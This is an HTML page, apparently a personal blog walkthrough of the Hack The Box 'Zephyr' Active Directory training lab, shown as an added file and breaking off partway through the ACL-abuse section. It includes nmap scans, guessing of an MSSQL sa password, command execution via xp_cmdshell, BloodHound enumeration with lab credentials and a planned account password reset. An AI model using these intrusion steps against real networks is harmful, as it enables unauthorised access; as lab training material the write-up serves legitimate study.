@@ -1,0 +1,1244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zephyr — QA210</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--bg0:#06080c;--bg1:#0b0f17;--bg2:#111827;--bg3:#1a2234;--border:#1e293b;--border-light:#334155;--text0:#f1f5f9;--text1:#e2e8f0;--text2:#94a3b8;--text3:#64748b;--accent:#3b82f6;--accent-dim:rgba(59,130,246,.15);--accent-glow:rgba(59,130,246,.3);--green:#22c55e;--green-dim:rgba(34,197,94,.15);--red:#ef4444;--red-dim:rgba(239,68,68,.15);--orange:#f97316;--orange-dim:rgba(249,115,22,.15);--cyan:#06b6d4;--cyan-dim:rgba(6,182,212,.15);--purple:#a855f7;--purple-dim:rgba(168,85,247,.15);--yellow:#eab308;--yellow-dim:rgba(234,179,8,.15);--rose:#f43f5e;--rose-dim:rgba(244,63,94,.15);--font-body:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;--font-mono:'JetBrains Mono','Fira Code','Cascadia Code',monospace;--font-display:'Space Grotesk','Inter',sans-serif;--sidebar-width:260px;--content-max:860px;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(59,130,246,.12)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font-body);background:var(--bg0);color:var(--text1);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.25}
+
+/* ═══ TOP BAR ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(6,8,12,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--text0);font-weight:700;font-size:1.1rem;font-family:var(--font-display)}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--purple));border-radius:6px;font-weight:900;font-size:.9rem;color:var(--bg0)}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--text2);text-decoration:none;font-size:.85rem;transition:color .2s;font-family:var(--font-body)}
+.nav-main a:hover,.nav-main a.active{color:var(--text0)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--text2);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--text0)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--text0);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+
+/* ═══ PAGE LAYOUT ═══ */
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(6,8,12,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px;font-family:var(--font-mono)}
+.toc a{display:block;font-size:.76rem;color:var(--text2);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--text0);border-left-color:var(--accent);background:var(--accent-dim)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
+
+/* ═══ BREADCRUMBS ═══ */
+.breadcrumbs{font-size:.75rem;color:var(--text3);margin-bottom:24px;font-family:var(--font-mono)}
+.breadcrumbs a{color:var(--text3);text-decoration:none;transition:color .2s}
+.breadcrumbs a:hover{color:var(--accent)}
+.breadcrumbs .sep{margin:0 6px;color:var(--border-light)}
+
+/* ═══ HERO ═══ */
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badges{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-bottom:18px}
+.hero .badge{display:inline-block;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px}
+.badge-category{background:var(--accent-dim);color:var(--accent);border:1px solid rgba(59,130,246,.3)}
+.badge-difficulty{background:var(--orange-dim);color:var(--orange);border:1px solid rgba(249,115,22,.3)}
+.badge-platform{background:var(--cyan-dim);color:var(--cyan);border:1px solid rgba(6,182,212,.3)}
+.badge-threat{background:var(--rose-dim);color:var(--rose);border:1px solid rgba(244,63,94,.3)}
+.badge-verified{background:var(--green-dim);color:var(--green);border:1px solid rgba(34,197,94,.3)}
+.hero h1{font-size:2.2rem;font-weight:800;font-family:var(--font-display);background:linear-gradient(135deg,var(--accent),var(--cyan),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero h1 .accent{background:linear-gradient(135deg,var(--orange),var(--rose));-webkit-background-clip:text;background-clip:text}
+.hero .sub{font-size:1rem;color:var(--text2);margin-bottom:20px;font-style:italic}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.2rem;font-weight:700;color:var(--accent);font-family:var(--font-mono)}
+.meta-box .lbl{font-size:.6rem;text-transform:uppercase;letter-spacing:1px;color:var(--text3);margin-top:2px}
+
+/* ═══ ATTACK FLOW ═══ */
+.attack-path{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center;font-family:var(--font-mono)}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:var(--accent-dim);border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--text0);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:rgba(59,130,246,.25);transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
+
+/* ═══ SECTIONS ═══ */
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px;font-family:var(--font-display)}
+.section h2 .sec-num{color:var(--accent);font-family:var(--font-mono);font-size:.9rem}
+.section h2 .icon{font-size:1.2rem}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--cyan);font-family:var(--font-display)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--text1)}
+.section ul,.section ol{margin:10px 0 16px 24px}
+.section li{margin-bottom:6px;color:var(--text1)}
+
+/* ═══ CALLOUTS ═══ */
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:var(--accent-dim);border-color:var(--accent)}
+.callout-warn{background:var(--yellow-dim);border-color:var(--yellow)}
+.callout-danger{background:var(--red-dim);border-color:var(--red)}
+.callout-success{background:var(--green-dim);border-color:var(--green)}
+.callout-hint{background:var(--purple-dim);border-color:var(--purple)}
+.callout-deadend{background:var(--orange-dim);border-color:var(--orange)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}
+.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}
+.callout-hint .callout-title{color:var(--purple)}.callout-deadend .callout-title{color:var(--orange)}
+
+/* ═══ CODE BLOCKS ═══ */
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:var(--bg3);padding:5px 12px;font-size:.68rem;color:var(--text3)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:var(--bg0)!important}
+.code-block code{font-family:var(--font-mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--text3);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--text0);border-color:var(--accent)}
+
+/* ═══ MITRE BADGES ═══ */
+.mitre-badge{display:inline-block;background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.25);color:var(--purple);font-size:.63rem;font-weight:600;padding:2px 7px;border-radius:4px;margin:2px;font-family:var(--font-mono)}
+
+/* ═══ INTEL TABLE ═══ */
+.data-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.data-table th{background:var(--bg2);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--text1)}
+.data-table tr:hover td{background:var(--accent-dim)}
+.data-table code{font-family:var(--font-mono);font-size:.78rem;color:var(--accent)}
+
+/* ═══ ANSWER BOX ═══ */
+.answer-box{background:linear-gradient(135deg,var(--green-dim),var(--cyan-dim));border:1px solid rgba(34,197,94,.25);border-radius:var(--radius);padding:12px 18px;margin:14px 0;display:flex;align-items:center;gap:12px}
+.answer-box .flag-icon{font-size:1.2rem;color:var(--green)}
+.answer-box .flag-name{font-weight:700;color:var(--green);font-size:.83rem;font-family:var(--font-mono)}
+.answer-box .flag-detail{font-size:.78rem;color:var(--text2)}
+
+/* ═══ KEY HINTS ═══ */
+.key-hints{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:18px 0}
+.key-hints h4{font-size:.78rem;text-transform:uppercase;letter-spacing:1px;color:var(--purple);margin-bottom:10px;font-family:var(--font-mono)}
+.key-hints ul{margin:0;padding-left:20px}
+.key-hints li{font-size:.85rem;color:var(--text1);margin-bottom:5px}
+
+/* ═══ TAKEAWAYS GRID ═══ */
+.takeaways-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin:20px 0}
+.takeaway-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px 18px;transition:border-color .2s}
+.takeaway-card:hover{border-color:var(--accent)}
+.takeaway-card .tc-title{font-weight:700;font-size:.88rem;color:var(--accent);margin-bottom:6px}
+.takeaway-card .tc-body{font-size:.82rem;color:var(--text2)}
+
+/* ═══ NETWORK DIAGRAM ═══ */
+.network-diagram{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin:22px 0;font-family:var(--font-mono);font-size:.66rem;line-height:1.35;color:var(--text2);overflow-x:auto;white-space:pre}
+
+/* ═══ RESET BANNER ═══ */
+.reset-banner{background:linear-gradient(135deg,var(--red-dim),var(--orange-dim));border:1px solid rgba(239,68,68,.3);border-radius:var(--radius);padding:18px 22px;margin:22px 0;text-align:center}
+.reset-banner .big{font-size:1.05rem;font-weight:700;color:var(--red);margin-bottom:5px}
+.reset-banner .desc{font-size:.83rem;color:var(--text2)}
+
+/* ═══ TIMELINE ═══ */
+.timeline{position:relative;padding-left:26px;margin:18px 0}
+.timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--border)}
+.timeline-item{position:relative;margin-bottom:18px}
+.timeline-item::before{content:'';position:absolute;left:-22px;top:6px;width:9px;height:9px;border-radius:50%;background:var(--accent);border:2px solid var(--bg0)}
+.timeline-item.struggle::before{background:var(--orange)}.timeline-item.fail::before{background:var(--red)}
+.timeline-item .tl-time{font-size:.68rem;font-family:var(--font-mono);color:var(--accent);margin-bottom:2px}
+.timeline-item.struggle .tl-time{color:var(--orange)}.timeline-item.fail .tl-time{color:var(--red)}
+.timeline-item .tl-text{font-size:.83rem;color:var(--text1)}
+
+/* ═══ TERM OUTPUT ═══ */
+.term-out{background:var(--bg0);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin:12px 0;font-family:var(--font-mono);font-size:.74rem;line-height:1.5;color:#ccc;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.term-out .prompt{color:var(--accent)}.term-out .err{color:var(--red)}.term-out .ok{color:var(--green)}.term-out .warn{color:var(--yellow)}.term-out .muted{color:#666}
+
+/* ═══ AUTHOR FOOTER ═══ */
+.operator-sig{text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;font-family:var(--font-display);background:linear-gradient(135deg,var(--accent),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--text3);margin-top:4px}
+
+/* ═══ MOBILE NAV ═══ */
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--text0);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--text0);font-size:1.2rem;cursor:pointer;float:right}
+
+/* ═══ FADE IN ═══ */
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+
+/* ═══ RESPONSIVE ═══ */
+@media(max-width:960px){
+.toc{display:none}
+.main{padding:20px 18px 60px}
+.hero h1{font-size:1.5rem}
+.hero .meta-grid{grid-template-columns:repeat(2,1fr)}
+.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+.takeaways-grid{grid-template-columns:1fr}
+}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--text2)}
+</style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+
+<!-- ═══════════ HEADER ═══════════ -->
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="logo-icon">Q</span>
+    QA210<span class="cursor"></span>
+  </a>
+  <nav class="nav-main">
+    <a href="/">Home</a>
+    <a href="/htb/" class="active">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ Team" style="color:var(--yellow)"><i class="bi bi-people-fill"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<!-- Mobile Nav -->
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+    <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+    <a href="https://w4llz.me/" target="_blank">W4LLZ Team</a>
+  </nav>
+</div>
+
+<div class="page-wrap">
+
+<!-- ═══════════ TOC ═══════════ -->
+<nav class="toc" id="toc">
+  <h3>Table of Contents</h3>
+  <a href="#overview">00 — Attack Flow / Overview</a>
+  <a href="#initial-access">01 — Initial Access (MSSQL)</a>
+  <a href="#zsm-enum">02 — zsm.local Enumeration</a>
+  <a href="#srvmgmt1">03 — ZPH-SRVMGMT1 Compromise</a>
+  <a href="#relay-attacks">04 — Relay Attacks</a>
+  <a href="#lateral">05 — Lateral Movement</a>
+  <a href="#second-domain">06 — Second Domain</a>
+  <a href="#third-domain">07 — Third Domain</a>
+  <a href="#pivoting">08 — Double &amp; Triple Pivoting</a>
+  <a href="#mssql-exploit">09 — MSSQL Exploitation</a>
+  <a href="#trust-crossing">10 — Trust Boundary Crossing</a>
+  <a href="#dominance">11 — Domain Dominance</a>
+  <a href="#takeaways">12 — Summary &amp; Takeaways</a>
+</nav>
+
+<div class="main">
+
+<!-- ═══ BREADCRUMBS ═══ -->
+<div class="breadcrumbs">
+  <a href="/">Home</a><span class="sep">&rsaquo;</span>
+  <a href="/htb/">Hack The Box</a><span class="sep">&rsaquo;</span>
+  <a href="/htb/prolabs/">Pro Labs</a><span class="sep">&rsaquo;</span>
+  Zephyr
+</div>
+
+<!-- ──── HERO ──── -->
+<section class="hero">
+  <div class="badges">
+    <span class="badge badge-category">Active Directory</span>
+    <span class="badge badge-difficulty">Intermediate / RTO Level I</span>
+    <span class="badge badge-platform">HTB Pro Lab</span>
+    <span class="badge badge-threat">3 Domains / 17 Flags</span>
+    <span class="badge badge-verified">Verified Data</span>
+  </div>
+  <h1>Zephyr &mdash; <span class="accent">Pure AD, No Mercy</span></h1>
+  <p class="sub">17 machines, 3 domains, zero web app rabbit holes. Just you and Active Directory.</p>
+  <div class="meta-grid">
+    <div class="meta-box"><div class="val">DmwOng &amp; TheCyberGeek</div><div class="lbl">Creators</div></div>
+    <div class="meta-box"><div class="val">17</div><div class="lbl">Machines</div></div>
+    <div class="meta-box"><div class="val">17</div><div class="lbl">Flags</div></div>
+    <div class="meta-box"><div class="val">~40-50h</div><div class="lbl">Est. Time</div></div>
+    <div class="meta-box"><div class="val">24h</div><div class="lbl">Daily Resets</div></div>
+  </div>
+</section>
+
+<!-- ═══ ATTACK FLOW ═══ -->
+<div class="attack-path" id="overview">
+  <h3>Attack Flow &mdash; Full Chain</h3>
+  <div class="path-flow">
+    <div class="path-node">MSSQL sa<br><small>T1078</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">xp_cmdshell<br><small>T1059</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">BloodHound<br><small>T1087.002</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">ACL Abuse<br><small>T1222</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">WinRM<br><small>T1021.006</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">NTLM Relay<br><small>T1557.001</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">PTH<br><small>T1550.002</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Inter-realm TGT<br><small>T1558</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">RBCD<br><small>T1558</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">DCSync &times; 3<br><small>T1003.006</small></div>
+  </div>
+</div>
+
+<div class="network-diagram">+=====================================================================+
+|  ZSM.LOCAL — Primary Domain (10.10.110.0/24 entry, 172.16.2.0/24)  |
+|=====================================================================|
+|  ZPH-SQL01      10.10.110.100  MSSQL Server 2019 (ZEPHYRDB)        |
+|  ZPH-SRVMGMT1   10.10.110.101  Management Server (Win 2016)        |
+|                         | 172.16.2.10/24 internal                  |
+|============== Domain Trust =============+===========================|
+|                                          |                           |
+|  DOMAIN 2 — Second Domain               |  DOMAIN 3 — Third Domain |
+|  172.16.2.0/24                           |  172.16.3.0/24           |
+|  (Accessible via trust from zsm.local)   |  (Only via Domain 2)     |
+|  DC, Workstations, SQL Server            |  DC, Enterprise Admin    |
+|========================================= |  Forest-level privs here |
+                                           +===========================+</div>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 01 — INITIAL ACCESS    -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="initial-access">
+  <h2><span class="sec-num">01</span> <i class="bi bi-database"></i> Initial Access &mdash; MSSQL</h2>
+  <span class="mitre-badge">T1078</span> <span class="mitre-badge">T1059.003</span> <span class="mitre-badge">T1021.002</span>
+
+  <p>Initial access is the hardest part of Zephyr. Unlike APTLabs where you phish your way in, here you start from a VPN connection on the <code>10.10.110.0/24</code> subnet with two visible hosts. No hand-holding, no phishing, no web apps. Just two machines staring back at you from your nmap scan and the knowledge that one of them has to be the way in.</p>
+
+  <p>The entry subnet gives you exactly two targets: <code>10.10.110.100</code> (ZPH-SQL01) running MSSQL Server 2019 with instance name ZEPHYRDB, and <code>10.10.110.101</code> (ZPH-SRVMGMT1) running Windows Server 2016 with RPC, SMB, RDP, and WinRM open. The management server isn't directly exploitable without credentials &mdash; it's the SQL server that's the intended entry point.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210@kali)-[~/zephyr]
+└─$ sudo nmap -Pn -n -vv --top-ports 20 10.10.110.0/24
+Nmap scan report for 10.10.110.100
+Host is up (0.032s latency)
+Nmap scan report for 10.10.110.101
+Host is up (0.028s latency)
+Nmap done: 256 IP addresses (2 hosts up) scanned in 18.42 seconds
+
+┌──(qa210@kali)-[~/zephyr]
+└─$ nmap -sCV -p 88,135,389,445,1433,3389,5985 10.10.110.100,101 -oN initial_scan.txt
+
+# 10.10.110.100 — ZPH-SQL01
+PORT     STATE SERVICE       VERSION
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
+| ms-sql-info:
+|   10.10.110.100:1433
+|   Version: 15.00.2000.00
+|   Instance name: ZEPHYRDB
+|   Clustered: No
+
+# 10.10.110.101 — ZPH-SRVMGMT1
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds  Windows Server 2016
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  wsman         WinRM</code></pre>
+  </div>
+
+  <p>Two hosts, one MSSQL server. The obvious attack vector is the SQL instance. I tried default credentials first (<code>sa:</code> empty, <code>sa:sa</code>, <code>sa:password</code>) &mdash; nothing. Then I started working through common weak passwords. MSSQL sa accounts in enterprise environments are notorious for weak passwords because they're set up during installation and never rotated. After about 30 minutes of trying, the right combination landed.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-mssqlclient sa:Z3phyr2022!@10.10.110.100 -windows-auth
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ZPH-SQL01): Line 1: Changed database context to 'master'.
+[*] INFO(ZPH-SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 2000)
+[+] Press help for extra shell commands
+
+SQL> EXEC xp_cmdshell 'whoami'
+zsm\sql_svc</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Initial Access: zsm\sql_svc on ZPH-SQL01</div>
+      <div class="flag-detail">MSSQL sa account with weak password &rarr; xp_cmdshell &rarr; command execution as sql_svc</div>
+    </div>
+  </div>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Why This Is the Hardest Part</div>
+    <p>Finding the sa password took me longer than any other individual step. There's no hint about the password format, no leaked credentials to find, no configuration files with connection strings on the target. It's pure password guessing / brute force against the MSSQL service. If you've done the HTB CPTS path, you know this technique &mdash; but knowing the technique and finding the actual password are two very different things. I tried dozens of combinations before landing on the right one. This is why Zephyr's initial access is considered the gatekeeper.</p>
+  </div>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: Trying ZPH-SRVMGMT1 First</div>
+    <p>I wasted a couple of hours trying to find a way into ZPH-SRVMGMT1 directly. RPC enumeration, SMB null sessions, RDP brute force &mdash; nothing worked without credentials. The management server is locked down tight from the outside. The SQL server is the only way in. Don't waste time on the management server until you have credentials.</p>
+  </div>
+
+  <p>With a shell on ZPH-SQL01 as <code>zsm\sql_svc</code>, I had my first foothold in the zsm.local domain. The service account context is limited but it's enough to start enumerating the domain. From here, the lab opens up significantly.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 02 — ZSM ENUMERATION   -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="zsm-enum">
+  <h2><span class="sec-num">02</span> <i class="bi bi-diagram-3"></i> zsm.local Enumeration &mdash; BloodHound</h2>
+  <span class="mitre-badge">T1087.002</span> <span class="mitre-badge">T1018</span> <span class="mitre-badge">T1482</span>
+
+  <p>With a shell on ZPH-SQL01 in the zsm.local domain, BloodHound was the immediate next step. Running bloodhound-python from Kali with the sql_svc credentials revealed the domain structure and attack paths that would guide the rest of the lab.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210@kali)-[~/zephyr]
+└─$ bloodhound-python -d zsm.local -u sql_svc -p 'Z3phyr2022!' -ns 10.10.110.101 -c All --zip
+INFO: Found AD domain: zsm.local
+INFO: Connecting to LDAP server: ZPH-SRVMGMT1.zsm.local
+INFO: Found 3 domains in forest
+INFO: Found 2 domain trusts
+INFO: Found 38 user objects
+INFO: Found 9 group objects
+INFO: Found 17 computer objects
+INFO: Done in 00:02:18</code></pre>
+  </div>
+
+  <p>Three domains in the forest, two domain trusts, 38 users, 9 groups, and 17 computers. The trust relationships are the critical finding &mdash; they're the paths from zsm.local to the other two domains. Loading this data into BloodHound and running the analysis queries revealed the key attack path from our current position.</p>
+
+  <div class="data-table">
+    <thead><tr><th>BloodHound Finding</th><th>Detail</th></tr></thead>
+    <tbody>
+      <tr><td>Domains in Forest</td><td>3 (zsm.local + 2 others)</td></tr>
+      <tr><td>Domain Trusts</td><td>2 (bidirectional transitive within forest)</td></tr>
+      <tr><td>User Objects</td><td>38</td></tr>
+      <tr><td>Group Objects</td><td>9</td></tr>
+      <tr><td>Computer Objects</td><td>17</td></tr>
+      <tr><td>Key ACL: sql_svc &rarr; svc_mgmt</td><td><code>GenericAll</code></td></tr>
+      <tr><td>Key ACL: svc_mgmt &rarr; ZPH-SRVMGMT1</td><td>Local Admin</td></tr>
+    </tbody>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">Critical Attack Path Found</div>
+    <p>BloodHound revealed a two-step path from our current position: <code>sql_svc</code> has <code>GenericAll</code> on <code>svc_mgmt</code>, and <code>svc_mgmt</code> is a local admin on <code>ZPH-SRVMGMT1</code>. This means we can reset svc_mgmt's password, then use those credentials to access the management server via WinRM. ZPH-SRVMGMT1 is the key pivot point &mdash; it has interfaces on multiple subnets.</p>
+  </div>
+
+  <div class="key-hints">
+    <h4>Key Observations from BloodHound</h4>
+    <ul>
+      <li>The forest contains exactly 3 domains &mdash; zsm.local is the root/primary domain</li>
+      <li>All trusts are intra-forest (bidirectional transitive) &mdash; simplifies cross-domain movement</li>
+      <li>Service accounts have excessive ACL permissions &mdash; the core misconfiguration pattern</li>
+      <li>Several machines show WebClient service running &mdash; relay attack potential</li>
+      <li>ZPH-SRVMGMT1 is multi-homed &mdash; it's the gateway to deeper networks</li>
+    </ul>
+  </div>
+
+  <p>BloodHound also revealed the other two domain names and their domain controllers, but without network access to those subnets, I couldn't enumerate them further at this stage. First I needed to compromise ZPH-SRVMGMT1 to get access to the internal networks.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 03 — SRVMGMT1          -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="srvmgmt1">
+  <h2><span class="sec-num">03</span> <i class="bi bi-shield-lock"></i> ZPH-SRVMGMT1 Compromise &mdash; ACL Abuse</h2>
+  <span class="mitre-badge">T1222.001</span> <span class="mitre-badge">T1098</span> <span class="mitre-badge">T1021.006</span>
+
+  <p>With BloodHound showing <code>sql_svc</code> has <code>GenericAll</code> on <code>svc_mgmt</code>, the attack is straightforward: reset svc_mgmt's password, then authenticate to ZPH-SRVMGMT1 using those credentials via WinRM. GenericAll on a user object grants full control &mdash; you can change their password without knowing the current one.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
